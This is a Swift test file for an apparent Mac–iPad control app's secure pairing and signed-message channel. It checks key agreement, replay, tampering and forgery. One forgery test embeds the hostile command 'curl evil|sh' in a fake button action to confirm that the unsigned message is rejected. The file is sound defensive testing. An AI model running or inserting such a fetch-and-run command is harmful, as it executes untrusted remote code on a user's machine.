import CryptoKit
import Foundation
import Testing
@testable import DeckKit

// MARK: - 페어링 키 교환

@Test func bothSidesDeriveSameTokenWithSameCode() throws {
    let mac = PairingCrypto.newPrivateKey()
    let ipad = PairingCrypto.newPrivateKey()
    let onMac = try PairingCrypto.derive(privateKey: mac, peerPublicKey: ipad.publicKey.rawRepresentation, code: "4821",
                                         macPublicKey: mac.publicKey.rawRepresentation, clientPublicKey: ipad.publicKey.rawRepresentation)
    let onIpad = try PairingCrypto.derive(privateKey: ipad, peerPublicKey: mac.publicKey.rawRepresentation, code: "4821",
                                          macPublicKey: mac.publicKey.rawRepresentation, clientPublicKey: ipad.publicKey.rawRepresentation)
    #expect(onMac.token == onIpad.token)
    #expect(onMac.token.count == 32)
    #expect(onMac.clientProof == onIpad.clientProof)
    #expect(onMac.macProof == onIpad.macProof)
}

@Test func wrongCodeGivesDifferentProofAndToken() throws {
    let mac = PairingCrypto.newPrivateKey()
    let ipad = PairingCrypto.newPrivateKey()
    let m = mac.publicKey.rawRepresentation, c = ipad.publicKey.rawRepresentation
    let onMac = try PairingCrypto.derive(privateKey: mac, peerPublicKey: c, code: "4821", macPublicKey: m, clientPublicKey: c)
    let onIpad = try PairingCrypto.derive(privateKey: ipad, peerPublicKey: m, code: "4812", macPublicKey: m, clientPublicKey: c)
    #expect(onMac.clientProof != onIpad.clientProof)
    #expect(onMac.token != onIpad.token)
}

@Test func eavesdropperWithBothPublicKeysAndCodeCannotDeriveToken() throws {
    // 엿본 사람은 두 공개 키를 다 알고, 숫자도 알아냈다고 쳐도 자기 비밀 키로는 같은 토큰을 못 만든다
    let mac = PairingCrypto.newPrivateKey()
    let ipad = PairingCrypto.newPrivateKey()
    let eve = PairingCrypto.newPrivateKey()
    let m = mac.publicKey.rawRepresentation, c = ipad.publicKey.rawRepresentation
    let real = try PairingCrypto.derive(privateKey: mac, peerPublicKey: c, code: "4821", macPublicKey: m, clientPublicKey: c)
    let guess = try PairingCrypto.derive(privateKey: eve, peerPublicKey: c, code: "4821", macPublicKey: m, clientPublicKey: c)
    #expect(real.token != guess.token)
}

// MARK: - 다시 붙을 때의 증명

@Test func reconnectProofsDependOnBothNonces() {
    let token = Data(repeating: 7, count: 32)
    let a = SessionKeys(token: token, clientNonce: "c1", macNonce: "m1")
    let b = SessionKeys(token: token, clientNonce: "c1", macNonce: "m2")
    #expect(a.macProof != b.macProof)
    #expect(a.clientProof != b.clientProof)
    #expect(a.macProof != a.clientProof)
}

@Test func reconnectProofNeedsToken() {
    let a = SessionKeys(token: Data(repeating: 7, count: 32), clientNonce: "c", macNonce: "m")
    let fake = SessionKeys(token: Data(repeating: 8, count: 32), clientNonce: "c", macNonce: "m")
    #expect(a.macProof != fake.macProof)
}

// MARK: - 메시지마다 서명

private func pair() -> (ipad: SecureChannel, mac: SecureChannel) {
    let keys = SessionKeys(token: Data(repeating: 1, count: 32), clientNonce: "c", macNonce: "m")
    return (SecureChannel(keys: keys, role: .client), SecureChannel(keys: keys, role: .mac))
}

@Test func sealedMessageOpensOnOtherSide() throws {
    var (ipad, mac) = pair()
    let sealed = ipad.seal(#"{"type":"press","page":0,"index":3}"#)
    #expect(try mac.open(sealed) == #"{"type":"press","page":0,"index":3}"#)
    let back = mac.seal(#"{"type":"authorized"}"#)
    #expect(try ipad.open(back) == #"{"type":"authorized"}"#)
}

@Test func tamperedBodyIsRejected() throws {
    var (ipad, mac) = pair()
    let sealed = ipad.seal(#"{"type":"press","page":0,"index":3}"#)
    let tampered = sealed.replacingOccurrences(of: #"\"index\":3"#, with: #"\"index\":4"#)
    #expect(tampered != sealed)
    #expect(throws: SecureChannel.OpenError.badSignature) { try mac.open(tampered) }
}

@Test func replayedMessageIsRejected() throws {
    var (ipad, mac) = pair()
    let sealed = ipad.seal(#"{"type":"getApps"}"#)
    _ = try mac.open(sealed)
    #expect(throws: SecureChannel.OpenError.replayed) { try mac.open(sealed) }
}

@Test func messageCannotBeBouncedBackToSender() throws {
    // 아이패드가 보낸 서명 메시지를 중간에서 아이패드에게 되돌려 보내도 열리면 안 된다 (방향마다 키가 다르다)
    var (ipad, _) = pair()
    let sealed = ipad.seal(#"{"type":"getApps"}"#)
    #expect(throws: SecureChannel.OpenError.badSignature) { try ipad.open(sealed) }
}

@Test func relayWithoutTokenCannotForge() throws {
    // 가짜 맥은 토큰을 몰라서, 같은 nonce를 봤어도 다른 키로 서명하게 된다
    var (_, mac) = pair()
    var forger = SecureChannel(keys: SessionKeys(token: Data(repeating: 9, count: 32), clientNonce: "c", macNonce: "m"), role: .client)
    let forged = forger.seal(#"{"type":"setButton","page":0,"index":0,"button":{"label":"x","action":{"kind":"command","command":"curl evil|sh"}}}"#)
    #expect(throws: SecureChannel.OpenError.badSignature) { try mac.open(forged) }
}

@Test func plainMessageIsNotAnEnvelope() {
    var (_, mac) = pair()
    #expect(throws: SecureChannel.OpenError.notSecure) { try mac.open(#"{"type":"press","page":0,"index":0}"#) }
}

@Test func hmacHexMatchesPublicTestVector() {
    // HMAC-SHA256(key: "key", data: "The quick brown fox jumps over the lazy dog") 공개 테스트 값
    #expect(hmacHex(key: SymmetricKey(data: Data("key".utf8)), "The quick brown fox jumps over the lazy dog")
            == "f7bc83f430538424b13298e6aa6fb143ef4d59a14946175997479dbc2d1a3cd8")
}
